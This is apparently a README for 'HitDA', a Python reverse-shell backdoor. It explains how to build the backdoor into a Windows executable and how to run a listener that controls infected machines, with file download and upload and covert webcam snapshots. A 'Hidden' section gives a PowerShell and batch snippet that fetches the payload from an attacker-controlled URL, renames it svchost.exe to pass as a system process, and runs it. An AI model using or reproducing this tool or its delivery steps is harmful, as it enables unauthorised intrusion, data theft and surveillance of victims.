# HitDA
This is a backdoor application based on TCP Reverse Shell write in Python3.
(Not shellcode).In addition to the basic reverse shell function
, you can also use some functions, Like **File Download/Upload**, **Webcam snapshot**.
 
## Setup
````
git clone https://github.com/HalukShan/HitD.git
````
 You need to install some dependencies on your Kali Linux, Use
 ````
cd HitDA; pip3 install -r ./requirements.txt
````
And install `pyinstaller`
```
pip3 install pyinstaller
```
Next install `docker-pyinstaller`, this tool help you generate a 
Windows `.exe` file more easily, but you should install docker first.
Now I give the complete steps below:

Add Docker PGP Authkey
````
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
````
Config Docker APT
```
echo 'deb [arch = amd64] https://download.docker.com/linux/debian buster stable'| sudo tee /etc/apt/sources.list.d/docker.list
```
Update apt and install
```
sudo apt-get update; sudo apt-get install docker-ce
```
Enable docker
```
sudo systemctl enable docker
```
After complete these steps, you can download `docker-pyinstaller`:
```
cd HitDA; git clone https://github.com/cdrx/docker-pyinstaller.git
```
Now you've done all the steps

## Usage
```
cd HitDA
```
Run the main script
```
python3 HitDA.py
```
Now you can see the menu
```
[*] Starting HitD...
[+] Init Success


    __    __   __  .___________. _______       ___      
   |  |  |  | |  | |           ||       \     /   \     
   |  |__|  | |  | `---|  |----`|  .--.  |   /  ^  \    
   |   __   | |  |     |  |     |  |  |  |  /  /_\  \   
   |  |  |  | |  |     |  |     |  '--'  | /  _____  \  
   |__|  |__| |__|     |__|     |_______/ /__/     \__\ 
                                                        

author: HalukShan
 =========================================================
||                     Menu Option                       ||
||                                                       ||
|| [0] Generate Script                                   ||
|| [1] Start Listening                                   ||
|| [9] Exit                                              ||
 =========================================================
```

### Listening
Choose option 1 to start the listening mode, enter your listening host
and port, then wait the connection. When successfully connect to the cmd shell, you can 
receive session, and type `session num` to open. Or check sessions 
by `sessions`, type `help` to get help. when opening session, 
use some command like

Download the specified remote file and save as local filename 
```
download <remote filename> <local_filename>
```
Upload file
```
upload <local_filename> <remote filename>
```
Webcam snapshot and save as filename
```
webcam_snap filename
```
There are some common usages of cmdshell
```
cd path
mkdir dirname
echo "content" >> filename
del filename
tasklist
taskkill /PID pid /F
netstat
```
### Hidden
You can use the **powershell** 
script to automate download the script and hide in some directorys, then execute
````
mkdir C:\tmp
cd C:\tmp
powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://youripordomain/script.exe','svchost.exe');
svchost.exe
````
Save as .bat file, and use **battoexe** to generate a small exe file.

## TroubleShoot
If you got the below error message when generating
```
Failed to establish a new connection: [Errno 11002] getaddrinfo failed')': /simple/opencv-python/
```
Adding Google DNS to your local config
```
vim /etc/resolv.conf
```
Add
```
# Google IPv4 nameservers
nameserver 8.8.8.8
nameserver 8.8.4.4
```
